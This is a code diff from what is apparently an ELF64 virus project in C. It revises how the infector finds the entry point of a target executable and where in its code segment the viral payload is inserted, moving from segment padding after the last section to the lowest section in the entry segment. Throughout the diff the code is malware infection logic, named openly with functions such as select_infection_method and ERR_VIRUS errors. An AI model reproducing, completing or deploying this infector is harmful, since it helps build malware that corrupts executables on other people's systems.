@@ -7,52 +7,13 @@
 
 struct data
 {
-	struct elf64_phdr	*safe_exec_phdr;
-	struct elf64_shdr	*safe_entry_shdr;
-	struct elf64_shdr	*safe_last_shdr;
-	Elf64_Off		end_of_last_section;
-	Elf64_Addr		e_entry;
+	struct elf64_phdr	*safe_entry_phdr;   // entry program header
+	struct elf64_shdr	*safe_entry_shdr;   // entry section header
+	struct elf64_shdr	*safe_low_shdr;     // lowest section header
+	Elf64_Addr		e_entry;            // program entry
 };
 
-static bool	find_entry_shdr(struct safe_ptr ref, const size_t offset,
-			void *data)
-{
-	Elf64_Shdr	*sect_hdr = safe(ref, offset, sizeof(Elf64_Shdr));
-
-	if (sect_hdr == NULL)
-		return errors(ERR_FILE, _ERR_F_BAD_SHDR_OFF);
-
-	struct data	*closure = data;
-
-	if (!closure->safe_exec_phdr)
-		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);
-
-	const Elf64_Off		p_offset  = closure->safe_exec_phdr->p_offset;
-	const Elf64_Xword	p_filesz  = closure->safe_exec_phdr->p_filesz;
-
-	const Elf64_Addr	sh_addr   = sect_hdr->sh_addr;
-	const Elf64_Off		sh_offset = sect_hdr->sh_offset;
-	const uint64_t		sh_size   = sect_hdr->sh_size;
-
-	const size_t		end_of_segment = p_offset + p_filesz;
-	const size_t		end_of_section = sh_offset + sh_size;
-
-	const Elf64_Addr	e_entry = closure->e_entry;
-	const Elf64_Off		end_of_last_section = closure->end_of_last_section;
-
-	if (sh_addr <= e_entry && e_entry < sh_addr + sh_size)
-	{
-		closure->safe_entry_shdr = sect_hdr;
-	}
-	if (end_of_last_section < end_of_section && end_of_section <= end_of_segment)
-	{
-		closure->safe_last_shdr = sect_hdr;
-		closure->end_of_last_section = sh_offset;
-	}
-	return true;
-}
-
-static bool	find_entry_phdr(struct safe_ptr ref, const size_t offset,
+static bool	find_phdr(struct safe_ptr ref, const size_t offset,
 			void *data)
 {
 	Elf64_Phdr	*seg_hdr = safe(ref, offset, sizeof(Elf64_Phdr));
@@ -68,53 +29,72 @@ static bool	find_entry_phdr(struct safe_ptr ref, const size_t offset,
 	struct data		*closure = data;
 	const Elf64_Addr	e_entry  = closure->e_entry;
 
-	if (is_exec_phdr(p_type, p_flags) && p_vaddr <= e_entry && e_entry < p_vaddr + p_memsz)
+	if (is_exec_phdr(p_type, p_flags)
+		&& p_vaddr <= e_entry && e_entry < p_vaddr + p_memsz)
 	{
-		closure->safe_exec_phdr = seg_hdr;
+		closure->safe_entry_phdr = seg_hdr;
 	}
 	return true;
 }
 
-static bool	has_enough_padding(struct elf64_phdr *safe_phdr,
-			size_t full_virus_size)
+static bool	find_shdr(struct safe_ptr ref, const size_t offset,
+			void *data)
 {
-	const uint64_t	p_memsz = safe_phdr->p_memsz;
-	const uint64_t	p_align = safe_phdr->p_align;
+	Elf64_Shdr	*sect_hdr = safe(ref, offset, sizeof(Elf64_Shdr));
 
-	const size_t	shift_amount = ALIGN(full_virus_size, PAGE_ALIGNMENT);
-	const size_t	padding_end  = (p_memsz % p_align) + shift_amount;
+	if (sect_hdr == NULL)
+		return errors(ERR_FILE, _ERR_F_BAD_SHDR_OFF);
 
-	return (padding_end <= p_align);
+	struct data	*closure = data;
+
+	if (!closure->safe_entry_phdr)
+		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);
+
+	size_t	stored_sh_addr = closure->safe_low_shdr ?
+			closure->safe_low_shdr->sh_addr : ~0ull;
+
+	const Elf64_Addr	e_entry  = closure->e_entry;
+	const Elf64_Off		p_vaddr  = closure->safe_entry_phdr->p_vaddr;
+	const uint64_t		p_filesz = closure->safe_entry_phdr->p_filesz;
+
+	const Elf64_Addr	sh_addr = sect_hdr->sh_addr;
+	const uint64_t		sh_size = sect_hdr->sh_size;
+
+	if (sh_addr <= e_entry && e_entry < sh_addr + sh_size)
+	{
+		closure->safe_entry_shdr = sect_hdr;
+	}
+	if (p_vaddr <= sh_addr && sh_addr < p_vaddr + p_filesz && sh_addr < stored_sh_addr)
+	{
+		closure->safe_low_shdr = sect_hdr;
+	}
+	return true;
 }
 
 static bool	select_infection_method(struct entry *entry,
-			struct data *closure, size_t full_virus_size)
+			struct data *closure)
 {
-	struct elf64_phdr	*safe_exec_phdr  = closure->safe_exec_phdr;
+	struct elf64_phdr	*safe_entry_phdr = closure->safe_entry_phdr;
 	struct elf64_shdr	*safe_entry_shdr = closure->safe_entry_shdr;
-	struct elf64_shdr	*safe_last_shdr  = closure->safe_last_shdr;
+	struct elf64_shdr	*safe_low_shdr   = closure->safe_low_shdr;
 	Elf64_Addr		e_entry          = closure->e_entry;
 
-	if (!safe_entry_shdr || !safe_last_shdr || !safe_exec_phdr)
+	if (!safe_entry_phdr || !safe_entry_shdr || !safe_low_shdr)
 		return errors(ERR_VIRUS, _ERR_V_MISSING_FILE_FIELDS);
 
 	const Elf64_Off		entry_sh_offset = safe_entry_shdr->sh_offset;
-	const Elf64_Addr	entry_sh_addr = safe_entry_shdr->sh_addr;
+	const Elf64_Addr	entry_sh_addr   = safe_entry_shdr->sh_addr;
 
 	entry->entry_offset = entry_sh_offset + (e_entry - entry_sh_addr);
 	entry->entry_addr   = entry_sh_addr   + (e_entry - entry_sh_addr);
 
-	if (has_enough_padding(safe_exec_phdr, full_virus_size))
-	{
-		const Elf64_Off		sh_offset = safe_last_shdr->sh_offset;
-		const uint64_t		sh_size   = safe_last_shdr->sh_size;
-		const Elf64_Addr	sh_addr   = safe_last_shdr->sh_addr;
+	const Elf64_Off		low_sh_offset = safe_low_shdr->sh_offset;
+	const Elf64_Addr	low_sh_addr   = safe_low_shdr->sh_addr;
 
-		entry->safe_phdr      = safe_exec_phdr;
-		entry->safe_shdr      = safe_last_shdr;
-		entry->payload_offset = sh_offset + sh_size;
-		entry->payload_addr   = sh_addr + sh_size;
-	}
+	entry->safe_phdr      = safe_entry_phdr;
+	entry->safe_shdr      = safe_low_shdr;
+	entry->payload_offset = low_sh_offset;
+	entry->payload_addr   = low_sh_addr;
 
 	if (entry->safe_phdr   == NULL || entry->safe_shdr      == NULL
 	|| entry->entry_offset == 0    || entry->payload_offset == 0
@@ -124,8 +104,7 @@ static bool	select_infection_method(struct entry *entry,
 	return true;
 }
 
-bool		find_entry(struct entry *entry, struct safe_ptr ref,
-			size_t full_virus_size)
+bool		find_entry(struct entry *entry, struct safe_ptr ref)
 {
 	struct data		closure;
 	const Elf64_Ehdr	*elf_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));
@@ -137,9 +116,9 @@ bool		find_entry(struct entry *entry, struct safe_ptr ref,
 	bzero(&closure, sizeof(closure));
 	closure.e_entry = elf_hdr->e_entry;
 
-	if (!foreach_phdr(ref, find_entry_phdr, &closure)
-	|| !foreach_shdr(ref, find_entry_shdr, &closure)
-	|| !select_infection_method(entry, &closure, full_virus_size))
+	if (!foreach_phdr(ref, find_phdr, &closure)
+	|| !foreach_shdr(ref, find_shdr, &closure)
+	|| !select_infection_method(entry, &closure))
 		return errors(ERR_THROW, _ERR_T_FIND_ENTRY);
 
 	return true;
